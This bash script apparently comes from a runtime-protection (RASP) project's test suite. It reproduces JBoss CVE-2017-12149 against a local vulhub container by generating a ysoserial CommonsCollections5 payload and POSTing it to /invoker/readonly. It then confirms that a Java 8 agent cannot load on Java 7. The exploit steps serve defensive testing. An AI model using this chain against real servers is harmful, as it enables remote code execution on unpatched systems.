#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_JBOSS_IMAGE:-vulhub/jboss:as-6.1.0}"
baseline_name="${OHMYRASP_VULHUB_JBOSS_BASELINE_NAME:-ohmyrasp-vulhub-jboss12149-baseline}"
protected_name="${OHMYRASP_VULHUB_JBOSS_PROTECTED_NAME:-ohmyrasp-vulhub-jboss12149-protected}"
baseline_port="${OHMYRASP_VULHUB_JBOSS_BASELINE_PORT:-19240}"
protected_port="${OHMYRASP_VULHUB_JBOSS_PROTECTED_PORT:-19241}"
ysoserial_jar="${OHMYRASP_YSOSERIAL_JAR:-/tmp/ohmyrasp-ysoserial/ysoserial.jar}"
success_file="/tmp/ohmyrasp-jboss12149-success"
baseline_dir="logs/vulhub-jboss-6.1.0-java7-baseline"
protected_dir="logs/vulhub-jboss-6.1.0-java7-protected"

ensure_image() {
  local image_ref="$1"
  if docker image inspect "$image_ref" >/dev/null 2>&1; then
    return
  fi
  docker pull "$image_ref" >/dev/null
}

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

wait_for_http() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local status

  for attempt in $(seq 1 120); do
    status="$(curl -sS -o "${dir}/ready-${attempt}.response" -w "%{http_code}" \
      "http://127.0.0.1:${port}/" 2>/dev/null || true)"
    if [[ "$status" != "000" ]]; then
      printf 'http_ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
      return
    fi
    sleep 1
  done

  docker logs "$name" >&2 || true
  echo "${name} did not expose JBoss at ${port}" >&2
  exit 1
}

generate_payload() {
  local output="$1"
  local ysoserial_dir
  local ysoserial_file

  # shellcheck source=scripts/lib/ysoserial.sh
  source scripts/lib/ysoserial.sh
  prepare_ysoserial_jar "$ysoserial_jar"

  if [[ ! -s "$ysoserial_jar" ]]; then
    echo "ysoserial jar not found at ${ysoserial_jar}" >&2
    exit 1
  fi

  ysoserial_dir="$(cd "$(dirname "$ysoserial_jar")" && pwd)"
  ysoserial_file="$(basename "$ysoserial_jar")"
  docker run --rm -v "${ysoserial_dir}:/ysoserial:ro" -w /ysoserial \
    eclipse-temurin:8-jre \
    java -jar "$ysoserial_file" CommonsCollections5 "touch ${success_file}" \
    > "$output"

  if [[ ! -s "$output" ]]; then
    echo "ysoserial did not generate a JBoss CVE-2017-12149 payload" >&2
    exit 1
  fi
}

send_payload() {
  local port="$1"
  local payload="$2"
  local output="$3"

  curl -sS -o "$output" -w "%{http_code}" \
    -H 'Content-Type: application/x-java-serialized-object' \
    --data-binary "@${payload}" \
    "http://127.0.0.1:${port}/invoker/readonly" || true
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

ensure_image "$image"
docker image inspect "$image" --format '{{json .Config.Env}}' > "${baseline_dir}/image-env.json"
docker run --rm --entrypoint sh "$image" -lc 'java -version' \
  > "${baseline_dir}/java-version.log" 2>&1

payload_file="${baseline_dir}/commonscollections5-touch.ser"
generate_payload "$payload_file"
wc -c "$payload_file" > "${baseline_dir}/payload-size.txt"

docker run -d --name "$baseline_name" \
  -p "${baseline_port}:8080" \
  "$image" >/dev/null

wait_for_http "$baseline_name" "$baseline_port" "$baseline_dir"
docker exec "$baseline_name" rm -f "$success_file"
status="$(send_payload "$baseline_port" "$payload_file" "${baseline_dir}/readonly.response")"
printf 'readonly_status=%s\n' "$status" >> "${baseline_dir}/attempts.log"
if ! docker exec "$baseline_name" sh -c "test -e '${success_file}'"; then
  sed -n '1,180p' "${baseline_dir}/readonly.response" >&2 || true
  docker logs "$baseline_name" >&2 || true
  echo "baseline JBoss CVE-2017-12149 did not create ${success_file}" >&2
  exit 1
fi
printf 'readonly_marker=present\n' >> "${baseline_dir}/attempts.log"

docker run -d --name "$protected_name" \
  -p "${protected_port}:8080" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" >/dev/null

sleep 3
docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
if ! grep -q 'Unsupported major.minor version 52.0' "${protected_dir}/container.log"; then
  sed -n '1,180p' "${protected_dir}/container.log" >&2 || true
  echo "JBoss Java 7 protected probe did not show Java 8 agent class-version mismatch" >&2
  exit 1
fi
if docker ps --filter "name=${protected_name}" --filter "status=running" --format '{{.Names}}' | grep -q .; then
  echo "JBoss Java 7 container unexpectedly kept running with Java 8 agent" >&2
  exit 1
fi

echo "vulhub JBoss CVE-2017-12149 Java7 legacy boundary passed"
